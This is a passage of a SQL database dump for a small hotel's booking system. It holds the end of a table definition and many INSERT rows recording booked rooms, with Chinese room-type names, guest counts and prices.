  `children` int(11) DEFAULT 0,
  `adults` int(11) DEFAULT 0,
  `amount` double DEFAULT 0,
  `ex_tax` double DEFAULT 0,
  `tax_rate` double DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_booking_room`
--

INSERT INTO `pm_booking_room` (`id`, `id_booking`, `id_room`, `title`, `num`, `children`, `adults`, `amount`, `ex_tax`, `tax_rate`) VALUES
(28, 28, 11, '原木雅逸三人房', NULL, 0, 1, 2200, 2200, NULL),
(29, 47, 1, '簡約雅致雙人房', '', 0, 2, 0, NULL, 0),
(30, 47, 1, '簡約雅致雙人房', '', 0, 2, 0, NULL, 0),
(31, 47, 4, '簡約商務雙人房', '', 0, 2, 0, NULL, 0),
(32, 47, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(33, 47, 5, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(34, 47, 5, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(35, 47, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(36, 47, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(37, 47, 10, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(38, 47, 11, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(39, 47, 7, '溫馨家庭房', '', 0, 0, 0, NULL, 0),
(40, 47, 8, '溫馨家庭房', '', 0, 0, 0, NULL, 0),
(41, 47, 9, '溫馨家庭房', '', 0, 0, 0, NULL, 0),
(42, 30, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(43, 30, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(44, 30, 5, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(45, 30, 5, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(46, 32, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(47, 32, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(48, 33, 6, '原木商務雙人房', '', 0, 2, 1400, 1400, 0),
(49, 34, 8, '和式單人房', NULL, 0, 1, 1200, 1200, NULL),
(51, 36, 4, '簡約商務雙人房', NULL, 1, 1, 1400, 1400, NULL),
(52, 37, 8, '和式單人房', NULL, 0, 1, 1000, 1000, NULL),
(53, 38, 5, '原木雅致雙人房', NULL, 0, 1, 1200, 1200, NULL),
(54, 39, 5, '原木雅致雙人房', NULL, 0, 1, 1200, 1200, NULL),
(55, 40, 5, '原木雅致雙人房', NULL, 0, 1, 1200, 1200, NULL),
(56, 43, 1, '簡約雅致雙人房', '', 0, 1, 0, NULL, 0),
(57, 43, 1, '簡約雅致雙人房', '', 0, 1, 0, NULL, 0),
(58, 43, 5, '原木雅致雙人房', '', 0, 1, 0, NULL, 0),
(59, 43, 5, '原木雅致雙人房', '', 0, 1, 0, NULL, 0),
(60, 43, 4, '簡約商務雙人房', '', 0, 1, 0, NULL, 0),
(66, 43, 7, '溫馨家庭房', '', 0, 1, 0, NULL, 0),
(68, 45, 5, '原木雅致雙人房', '', 0, 2, 1200, 1200, 0),
(69, 48, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(70, 48, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(71, 48, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(72, 48, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(73, 48, 5, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(74, 48, 5, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(75, 48, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(76, 48, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(77, 48, 7, '溫馨家庭房', '', 0, 0, 0, NULL, 0),
(78, 48, 8, '和式單人房', '', 0, 0, 0, NULL, 0),
(79, 48, 9, '簡約工業風五人房', '', 0, 0, 0, NULL, 0),
(80, 48, 10, '簡約雅逸三人房', '', 0, 0, 0, NULL, 0),
(81, 48, 11, '原木雅逸三人房', '', 0, 0, 0, NULL, 0),
(82, 49, 5, '原木雅致雙人房', NULL, 0, 1, 1400, 1400, NULL),
(83, 50, 4, '簡約商務雙人房', NULL, 0, 2, 1400, 1400, NULL),
(84, 50, 4, '簡約商務雙人房', NULL, 0, 2, 1400, 1400, NULL),
(85, 50, 5, '原木雅致雙人房', NULL, 0, 2, 1400, 1400, NULL),
(86, 50, 6, '原木商務雙人房', NULL, 0, 2, 1400, 1400, NULL),
(87, 51, 5, '原木雅致雙人房', NULL, 0, 1, 1400, 1400, NULL),
(88, 52, 4, '簡約商務雙人房', NULL, 0, 2, 1200, 1200, NULL),
(89, 53, 8, '和式單人房', NULL, 0, 1, 1000, 1000, NULL),
(90, 54, 1, '簡約雅致雙人房', NULL, 0, 1, 3600, 3600, NULL),
(91, 55, 9, '簡約工業風五人房', NULL, 0, 1, 3600, 3600, NULL),
(92, 56, 8, '和式單人房', NULL, 0, 1, 2000, 2000, NULL),
(93, 57, 5, '原木雅致雙人房', NULL, 0, 1, 1400, 1400, NULL),
(94, 58, 1, '簡約雅致雙人房', NULL, 0, 1, 2400, 2400, NULL),
(95, 58, 4, '簡約商務雙人房', NULL, 0, 2, 2400, 2400, NULL),
(96, 59, 10, '簡約雅逸三人房', NULL, 0, 1, 2200, 2200, NULL),
(97, 60, 6, '原木商務雙人房', NULL, 0, 2, 3600, 3600, NULL),
(98, 61, 10, '溫馨家庭房', '', 0, 2, 0, NULL, 0),
(99, 62, 4, '簡約商務雙人房', NULL, 0, 1, 1200, 1200, NULL),
(100, 63, 8, '和式單人房', '', 0, 0, 0, NULL, 0),
(101, 64, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(102, 65, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(103, 66, 11, '原木雅逸三人房', '', 0, 0, 0, NULL, 0),
(104, 67, 8, '和式單人房', '', 0, 0, 0, NULL, 0),
(105, 68, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(106, 69, 6, '原木商務雙人房', NULL, 0, 2, 1400, 1400, NULL),
(107, 69, 6, '原木商務雙人房', NULL, 0, 2, 1400, 1400, NULL),
(108, 70, 11, '原木雅逸三人房', '', 0, 0, 0, NULL, 0),
(109, 71, 8, '和式單人房', '', 0, 0, 0, NULL, 0),
(110, 72, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(111, 73, 11, '原木雅逸三人房', '', 0, 0, 0, NULL, 0),
(112, 74, 8, '和式單人房', '', 0, 0, 0, NULL, 0),
(113, 75, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(114, 76, 4, '簡約商務雙人房', NULL, 0, 2, 2600, 2600, NULL),
(115, 77, 11, '原木雅逸三人房', '', 0, 0, 0, NULL, 0),
(116, 78, 8, '和式單人房', '', 0, 0, 0, NULL, 0),
(117, 79, 11, '原木雅逸三人房', '', 0, 0, 0, NULL, 0),
(118, 80, 8, '和式單人房', '', 0, 0, 0, NULL, 0),
(119, 81, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(120, 82, 4, '簡約商務雙人房', NULL, 0, 1, 5200, 5200, NULL),
(121, 83, 7, '溫馨家庭房', NULL, 0, 1, 2400, 2400, NULL),
(122, 84, 10, '簡約雅逸三人房', '', 0, 1, 2200, 2200, 0),
(123, 85, 7, '溫馨家庭房', '', 1, 2, 2800, 2800, 0),
(126, 89, 4, '簡約商務雙人房', NULL, 0, 1, 1400, 1400, NULL),
(127, 90, 4, '簡約商務雙人房', NULL, 0, 2, 2600, 2600, NULL),
(128, 90, 4, '簡約商務雙人房', NULL, 0, 2, 2600, 2600, NULL),
(129, 91, 7, '溫馨家庭房', NULL, 1, 3, 4800, 4800, NULL),
(130, 92, 4, '簡約商務雙人房', NULL, 0, 2, 2800, 2800, NULL),
(131, 93, 9, '簡約工業風五人房', '', 0, 0, 0, NULL, 0),
(132, 93, 7, '溫馨家庭房', '', 0, 0, 0, NULL, 0),
(133, 94, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(134, 94, 6, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(135, 94, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(136, 94, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(137, 94, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(138, 94, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(139, 94, 5, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(140, 94, 5, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(141, 94, 8, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(142, 94, 7, '溫馨家庭房', '', 0, 0, 0, NULL, 0),
(143, 94, 9, '溫馨家庭房', '', 0, 0, 0, NULL, 0),
(144, 94, 10, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(145, 94, 11, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(146, 95, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(147, 95, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(148, 95, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(149, 95, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(150, 95, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(151, 95, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(152, 95, 5, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(153, 95, 5, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(154, 95, 7, '溫馨家庭房', '', 0, 0, 0, NULL, 0),
(155, 95, 8, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(156, 95, 9, '溫馨家庭房', '', 0, 0, 0, NULL, 0),
(157, 95, 10, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(158, 95, 11, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(159, 96, 4, '簡約商務雙人房', NULL, 0, 1, 3600, 3600, NULL),
(160, 97, 4, '簡約商務雙人房', NULL, 0, 1, 1200, 1200, NULL),
(161, 98, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(162, 98, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(163, 98, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(164, 98, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(165, 99, 9, '簡約工業風五人房', '', 0, 0, 0, NULL, 0),
(166, 100, 7, '溫馨家庭房', '', 0, 0, 0, NULL, 0),
(167, 101, 4, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(168, 101, 10, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(169, 102, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(170, 103, 1, '簡約工業風五人房', '', 0, 0, 0, NULL, 0),
(173, 104, 9, '簡約工業風五人房', '', 0, 0, 0, NULL, 0),
(174, 103, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(175, 103, 10, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(176, 105, 5, '原木雅致雙人房', NULL, 0, 2, 1200, 1200, NULL),
(177, 106, 4, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(178, 106, 10, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(179, 107, 5, '原木雅致雙人房', NULL, 0, 2, 1200, 1200, NULL),
(180, 108, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(181, 109, 4, '簡約商務雙人房', NULL, 0, 2, 2400, 2400, NULL),
(182, 110, 11, '原木雅逸三人房(無窗)', NULL, 0, 3, 4000, 4000, NULL),
(183, 111, 1, '簡約雅致雙人房', NULL, 0, 1, 2400, 2400, NULL),
(184, 112, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(185, 113, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(186, 114, 5, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(187, 115, 5, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(188, 116, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(189, 117, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(190, 118, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(191, 119, 4, '簡約商務雙人房', NULL, 0, 2, 2400, 2400, NULL),
(192, 119, 4, '簡約商務雙人房', NULL, 0, 2, 2400, 2400, NULL),
(193, 120, 9, '簡約工業風五人房', NULL, 0, 5, 3600, 3600, NULL),
(194, 121, 1, '原木商務雙人房', '', 0, 2, 0, NULL, 0),
(195, 121, 1, '簡約雅致雙人房', '', 0, 2, 0, NULL, 0),
(196, 121, 4, '簡約雅致雙人房', '', 0, 2, 0, NULL, 0),
(197, 121, 4, '簡約商務雙人房', '', 0, 2, 0, NULL, 0),
(198, 121, 5, '簡約商務雙人房', '', 0, 2, 0, NULL, 0),
(199, 121, 5, '原木雅致雙人房', '', 0, 2, 0, NULL, 0),
(200, 121, 6, '原木商務雙人房', '', 0, 2, 0, NULL, 0),
(201, 121, 6, '原木商務雙人房', '', 0, 2, 0, NULL, 0),
(202, 121, 7, '溫馨家庭房', '', 0, 4, 0, NULL, 0),
(203, 121, 8, '簡約雅致雙人房', '', 0, 1, 0, NULL, 0),
(204, 121, 9, '溫馨家庭房', '', 0, 5, 0, NULL, 0),
(205, 121, 10, '簡約雅致雙人房', '', 0, 2, 0, NULL, 0),
(206, 121, 11, '簡約雅致雙人房', '', 0, 2, 0, NULL, 0),
(207, 122, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(208, 123, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(209, 124, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(210, 125, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(211, 126, 7, '溫馨家庭房', '', 0, 0, 0, NULL, 0),
(212, 127, 10, '簡約雅逸三人房(無窗)', '', 0, 0, 0, NULL, 0),
(213, 128, 1, '原木雅致雙人房', '', 0, 2, 0, NULL, 0),
(214, 128, 1, '簡約雅致雙人房', '', 0, 2, 0, NULL, 0),
(215, 128, 4, '簡約商務雙人房', '', 0, 2, 0, NULL, 0),
(216, 128, 4, '簡約商務雙人房', '', 0, 2, 0, NULL, 0),
(217, 129, 1, '原木商務雙人房', '', 0, 2, 0, NULL, 0),
(218, 129, 1, '簡約雅致雙人房', '', 0, 2, 0, NULL, 0),
(219, 129, 5, '原木雅致雙人房', '', 0, 2, 0, NULL, 0),
(220, 129, 5, '原木雅致雙人房', '', 0, 2, 0, NULL, 0),
(221, 129, 4, '簡約商務雙人房', '', 0, 2, 0, NULL, 0),
(222, 129, 8, '簡約雅致雙人房', '', 0, 1, 0, NULL, 0),
(223, 130, 10, '簡約雅逸三人房(無窗)', '', 0, 0, 0, NULL, 0),
(224, 131, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(225, 132, 7, '溫馨家庭房', NULL, 0, 4, 2400, 2400, NULL),
(226, 133, 1, '簡約雅致雙人房', NULL, 0, 2, 2400, 2400, NULL),
(227, 134, 7, '溫馨家庭房', NULL, 0, 1, 4800, 4800, NULL),
(228, 135, 10, '簡約雅逸三人房(無窗)', NULL, 0, 1, 1800, 1800, NULL),
(229, 136, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(230, 137, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(231, 138, 9, '簡約工業風五人房', '', 0, 0, 0, NULL, 0),
(232, 139, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(233, 140, 10, '簡約雅逸三人房(無窗)', '', 0, 0, 0, NULL, 0),
(234, 141, 1, '簡約雅致雙人房', NULL, 0, 1, 1200, 1200, NULL),
(235, 142, 8, '迷你雙人房/和式單人房', NULL, 0, 1, 4200, 4200, NULL),
(236, 143, 7, '溫馨家庭房', NULL, 0, 1, 2800, 2800, NULL),
(237, 144, 10, '簡約雅逸三人房(無窗)', NULL, 0, 3, 1800, 1800, NULL),
(238, 145, 11, '原木雅逸三人房(無窗)', '', 0, 0, 0, NULL, 0),
(239, 146, 6, '原木商務雙人房', '', 0, 2, 0, NULL, 0),
(240, 146, 4, '簡約雅致雙人房', '', 0, 2, 0, NULL, 0),
(241, 146, 4, '簡約雅致雙人房', '', 0, 2, 0, NULL, 0),
(242, 146, 4, '簡約雅致雙人房', '', 0, 2, 0, NULL, 0),
(243, 146, 10, '簡約雅致雙人房', '', 0, 3, 0, NULL, 0),
(244, 146, 9, '簡約雅致雙人房', '', 0, 5, 0, NULL, 0),
(245, 146, 7, '簡約雅致雙人房', '', 0, 4, 0, NULL, 0),
(246, 147, 11, '原木雅逸三人房(無窗)', NULL, 0, 3, 5800, 5800, NULL),
(247, 148, 1, '簡約雅致雙人房', NULL, 0, 2, 1200, 1200, NULL),
(248, 149, 8, '迷你雙人房/和式單人房', NULL, 0, 1, 1000, 1000, NULL),
(249, 150, 10, '簡約雅逸三人房(無窗)', NULL, 1, 2, 2200, 2200, NULL),
(250, 151, 5, '原木雅致雙人房', NULL, 0, 2, 1400, 1400, NULL),
(251, 151, 5, '原木雅致雙人房', NULL, 0, 2, 1400, 1400, NULL),
(252, 152, 1, '簡約雅致雙人房', NULL, 0, 2, 4000, 4000, NULL),
(253, 152, 1, '簡約雅致雙人房', NULL, 0, 1, 4000, 4000, NULL),
(257, 156, 11, '原木雅逸三人房(無窗)', NULL, 0, 1, 2200, 2200, NULL),
(258, 157, 1, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(259, 157, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(260, 157, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(261, 157, 4, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(262, 157, 5, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(263, 157, 5, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(264, 157, 6, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(265, 157, 6, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(266, 157, 7, '溫馨家庭房', '', 0, 0, 0, NULL, 0),
(267, 157, 8, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(268, 157, 9, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(269, 157, 10, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(270, 157, 11, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(271, 158, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(272, 158, 4, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(273, 159, 7, '溫馨家庭房', '', 0, 0, 0, NULL, 0),
(274, 160, 1, '簡約雅致雙人房', NULL, 0, 1, 1200, 1200, NULL),
(275, 161, 5, '原木雅致雙人房', NULL, 0, 2, 1200, 1200, NULL),
(276, 162, 1, '簡約雅致雙人房', NULL, 0, 2, 2400, 2400, NULL),
(277, 163, 8, '迷你雙人房/和式單人房', NULL, 0, 1, 1200, 1200, NULL),
(278, 164, 9, '簡約工業風五人房', NULL, 0, 5, 3600, 3600, NULL),
(279, 165, 5, '原木雅致雙人房', NULL, 0, 2, 2800, 2800, NULL),
(280, 165, 5, '原木雅致雙人房', NULL, 0, 2, 2800, 2800, NULL),
(281, 166, 4, '簡約商務雙人房', NULL, 0, 2, 1400, 1400, NULL),
(282, 167, 5, '原木雅致雙人房', NULL, 0, 1, 1400, 1400, NULL),
(283, 168, 5, '原木雅致雙人房', NULL, 0, 1, 1400, 1400, NULL),
(284, 169, 5, '原木雅致雙人房', NULL, 0, 1, 1200, 1200, NULL),
(285, 170, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(286, 170, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(287, 171, 1, '簡約雅致雙人房', NULL, 0, 2, 1400, 1400, NULL),
(288, 172, 5, '原木雅致雙人房', '', 0, 2, 0, NULL, 0),
(289, 172, 1, '簡約雅致雙人房', '', 0, 2, 0, NULL, 0),
(290, 172, 1, '簡約雅致雙人房', '', 0, 2, 0, NULL, 0),
(291, 172, 5, '原木雅致雙人房', '', 0, 2, 0, NULL, 0),
(292, 173, 7, '溫馨家庭房', NULL, 0, 1, 5600, 5600, NULL),
(293, 174, 1, '簡約雅致雙人房', NULL, 0, 1, 1400, 1400, NULL),
(294, 175, 1, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(295, 175, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(296, 175, 4, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(297, 175, 4, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(298, 175, 5, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(299, 175, 5, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(300, 175, 6, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(301, 175, 6, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(302, 175, 7, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(303, 175, 8, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(304, 175, 9, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(305, 175, 10, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(306, 175, 11, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(307, 176, 1, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(308, 176, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(309, 176, 4, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(310, 176, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(311, 177, 7, '溫馨家庭房', '', 0, 0, 0, NULL, 0),
(312, 178, 5, '原木雅致雙人房', NULL, NULL, 1, 8400, 8400, NULL),
(313, 179, 5, '原木雅致雙人房', NULL, 0, 1, 8400, 8400, NULL),
(314, 180, 5, '原木雅致雙人房', NULL, 0, 1, 1400, 1400, NULL),
(315, 181, 10, '簡約雅逸三人房(無窗)', NULL, 1, 2, 2200, 2200, NULL),
(316, 181, 1, '簡約雅致雙人房', NULL, 0, 2, 1400, 1400, NULL),
(317, 181, 1, '簡約雅致雙人房', NULL, 0, 2, 1400, 1400, NULL),
(318, 181, 5, '原木雅致雙人房', NULL, 0, 2, 1400, 1400, NULL),
(319, 182, 1, '簡約雅致雙人房', NULL, 0, 1, 1400, 1400, NULL),
(320, 183, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(321, 183, 6, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(322, 183, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(323, 183, 4, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(324, 183, 4, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(325, 183, 7, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(326, 183, 9, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(327, 183, 10, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(328, 183, 11, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(329, 184, 4, '簡約商務雙人房', NULL, 0, 2, 2800, 2800, NULL),
(330, 185, 1, '簡約雅致雙人房', NULL, 0, 2, 1400, 1400, NULL),
(331, 185, 10, '簡約雅逸三人房(無窗)', NULL, 0, 3, 2200, 2200, NULL),
(332, 186, 1, '簡約雅致雙人房', NULL, 0, 2, 2400, 2400, NULL),
(333, 187, 1, '簡約雅致雙人房', NULL, 0, 1, 1400, 1400, NULL),
(334, 188, 5, '原木雅致雙人房', NULL, 0, 1, 1400, 1400, NULL),
(335, 189, 7, '溫馨家庭房', NULL, 0, 4, 2800, 2800, NULL),
(336, 190, 7, '溫馨家庭房', NULL, 2, 2, 2800, 2800, NULL),
(337, 191, 7, '溫馨家庭房', NULL, 2, 2, 2800, 2800, NULL),
(338, 192, 1, '簡約雅致雙人房', NULL, 0, 1, 1400, 1400, NULL),
(339, 193, 1, '簡約雅致雙人房', NULL, 0, 1, 1400, 1400, NULL),
(340, 194, 7, '溫馨家庭房', NULL, 0, 1, 2800, 2800, NULL),
(341, 195, 4, '簡約商務雙人房', NULL, 0, 2, 1400, 1400, NULL),
(342, 196, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(343, 196, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(344, 196, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(345, 196, 5, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(346, 196, 5, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(347, 196, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(348, 197, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(349, 197, 6, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(350, 197, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(351, 197, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(352, 197, 4, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(353, 197, 4, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(354, 197, 6, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(355, 197, 6, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(356, 197, 7, '溫馨家庭房', '', 0, 0, 0, NULL, 0),
(357, 198, 4, '簡約商務雙人房', NULL, 0, 2, 1400, 1400, NULL),
(358, 199, 1, '簡約雅致雙人房', NULL, 0, 2, 1400, 1400, NULL),
(359, 200, 6, '原木商務雙人房', NULL, 0, 2, 2800, 2800, NULL),
(360, 201, 4, '簡約商務雙人房', NULL, 0, 2, 1400, 1400, NULL),
(361, 202, 9, '簡約工業風五人房', NULL, 1, 4, 3600, 3600, NULL),
(362, 202, 6, '原木商務雙人房', NULL, 0, 2, 1400, 1400, NULL),
(363, 203, 1, '簡約雅致雙人房', NULL, 0, 2, 2800, 2800, NULL),
(364, 204, 1, '簡約雅致雙人房', NULL, 0, 2, 1400, 1400, NULL),
(365, 205, 5, '原木雅致雙人房', NULL, 0, 2, 1400, 1400, NULL),
(366, 205, 6, '原木商務雙人房', NULL, 0, 2, 1400, 1400, NULL),
(367, 206, 1, '簡約雅致雙人房', NULL, 0, 2, 5600, 5600, NULL),
(368, 206, 1, '簡約雅致雙人房', NULL, 0, 1, 5600, 5600, NULL),
(369, 207, 7, '溫馨家庭房', NULL, 2, 2, 5600, 5600, NULL),
(370, 208, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(371, 208, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(372, 208, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(373, 208, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(374, 208, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(375, 208, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(376, 208, 8, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(377, 209, 5, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(378, 210, 6, '原木商務雙人房', NULL, 0, 2, 1400, 1400, NULL),
(379, 211, 6, '原木商務雙人房', NULL, 0, 1, 1400, 1400, NULL),
(380, 212, 4, '簡約商務雙人房', NULL, 0, 1, 4200, 4200, NULL),
(381, 213, 7, '溫馨家庭房', NULL, 2, 2, 2800, 2800, NULL),
(382, 214, 7, '溫馨家庭房', NULL, 1, 3, 5600, 5600, NULL),
(383, 215, 4, '簡約商務雙人房', NULL, 0, 1, 2800, 2800, NULL),
(384, 216, 4, '簡約商務雙人房', NULL, 0, 1, 1400, 1400, NULL),
(385, 217, 6, '原木商務雙人房', NULL, 1, 1, 1400, 1400, NULL),
(386, 218, 8, '迷你雙人房/和式單人房', NULL, 0, 1, 1200, 1200, NULL),
(387, 219, 1, '簡約雅致雙人房', NULL, 0, 2, 1400, 1400, NULL),
(388, 220, 10, '簡約雅逸三人房(無窗)', NULL, 0, 3, 2200, 2200, NULL),
(389, 221, 1, '簡約雅致雙人房', NULL, 0, 2, 2800, 2800, NULL),
(390, 222, 10, '簡約雅逸三人房(無窗)', NULL, 0, 1, 2200, 2200, NULL),
(391, 223, 4, '簡約商務雙人房', NULL, 0, 2, 4200, 4200, NULL),
(392, 224, 7, '溫馨家庭房', NULL, 1, 3, 2800, 2800, NULL),
(393, 225, 7, '溫馨家庭房', NULL, 0, 4, 2800, 2800, NULL),
(394, 226, 1, '簡約雅致雙人房', NULL, 0, 1, 1400, 1400, NULL),
(395, 227, 1, '簡約雅致雙人房', NULL, 0, 1, 1400, 1400, NULL),
(396, 228, 4, '簡約商務雙人房', NULL, 0, 2, 1400, 1400, NULL),
(397, 229, 5, '原木雅致雙人房', NULL, 0, 2, 4200, 4200, NULL),
(398, 230, 1, '簡約雅致雙人房', NULL, 0, 2, 1400, 1400, NULL),
(399, 230, 1, '簡約雅致雙人房', NULL, 0, 2, 1400, 1400, NULL),
(400, 230, 8, '迷你雙人房/和式單人房', NULL, 0, 1, 1200, 1200, NULL),
(401, 231, 4, '簡約商務雙人房', NULL, 0, 1, 1400, 1400, NULL),
(402, 232, 7, '溫馨家庭房', NULL, 2, 2, 2800, 2800, NULL),
(403, 233, 4, '簡約商務雙人房', NULL, 0, 1, 2800, 2800, NULL),
